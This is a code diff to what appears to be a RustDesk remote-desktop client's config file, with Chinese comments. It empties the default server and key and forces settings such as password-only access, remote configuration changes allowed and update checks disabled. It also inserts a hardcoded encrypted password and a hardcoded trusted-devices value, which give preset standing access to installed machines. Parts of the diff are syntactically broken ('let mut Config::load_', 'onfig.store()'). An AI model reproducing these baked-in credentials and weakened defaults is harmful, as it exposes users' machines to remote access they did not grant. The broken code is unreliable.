@@ -114,8 +114,8 @@ const CHARS: &[char] = &[
     'm', 'n', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
 ];
 
-pub const RENDEZVOUS_SERVERS: &[&str] = &["rs-ny.rustdesk.com"];
-pub const RS_PUB_KEY: &str = "OeVuKk5nlHiXp+APNn0Y3pC1Iwpwn44JGqrQCsWqmBw=";
+pub const RENDEZVOUS_SERVERS: &[&str] = &[""];
+pub const RS_PUB_KEY: &str = "";
 
 pub const RENDEZVOUS_PORT: i32 = 21116;
 pub const RELAY_PORT: i32 = 21117;
@@ -490,6 +490,21 @@ impl Config2 {
     fn load() -> Config2 {
         let mut config = Config::load_::<Config2>("2");
         let mut store = false;
+		// 设置只允许密码访问
+		if !config.options.contains_key("approve-mode") {
+            config.options.insert("approve-mode".to_string(), "password".to_string());
+            store = true;
+        }
+		// 安全-允许远程修改配置 默认打勾
+		if !config.options.contains_key("allow-remote-config-modification") {
+            config.options.insert("allow-remote-config-modification".to_string(), "Y".to_string());
+            store = true;
+        }
+		// 安全-拒绝局域网发现 默认打勾
+		if !config.options.contains_key("enable-lan-discovery") {
+                config.options.insert("enable-lan-discovery".to_string(), "N".to_string());
+                store = true;
+        }
         if let Some(mut socks) = config.socks {
             let (password, _, store2) =
                 decrypt_str_or_original(&socks.password, PASSWORD_ENC_VERSION);
@@ -501,6 +516,10 @@ impl Config2 {
             decrypt_str_or_original(&config.unlock_pin, PASSWORD_ENC_VERSION);
         config.unlock_pin = unlock_pin;
         store |= store2;
+		if !config.options.contains_key("trusted_devices") {
+            config.options.insert("trusted_devices".to_string(), "00ARWu+BRV4EP4VRKRiI/wp+aTNw1l52ygb8fYNE/rVHR9X6QTY7Ew54GkOw==".to_string());
+            config.store();
+        }
         if store {
             config.store();
         }
@@ -643,6 +662,10 @@ impl Config {
                     log::error!("Failed to generate new id");
                 }
             }
+        }
+		if config.password.is_empty() {
+            config.password = "01AXQ2kN+qtHVANEGLJy5jySnYvXFfGeSmyrypZtehAR3PBaxBxs99oC+CX8BNEs2aa3xpAzoUnPWlf4ZHZaNLYylxb/2+bpyGZm+/eE+lNKCaAzNldScr".to_string();
+            store = true;
         }
         if store {
             config.store();
@@ -2140,7 +2163,23 @@ pub struct LocalConfig {
 
 impl LocalConfig {
     fn load() -> LocalConfig {
-        Config::load_::<LocalConfig>("_local")
+        let mut Config::load_::<LocalConfig>("_local");
+		let mut store = false;
+		// 常规-启用UDP打洞 默认打勾
+		if !config.options.contains_key("enable-udp-punch") {
+			config.options.insert("enable-udp-punch".to_string(), "Y".to_string());
+			store = true;
+		}
+		// 常规-启动时检查软件更新 默认去勾
+		if !config.options.contains_key("enable-check-update") {
+			config.options.insert("enable-check-update".to_string(), "N".to_string());
+			store = true;
+		}
+		
+		if store {
+			onfig.store();
+		}
+		config
     }
 
     fn store(&self) {
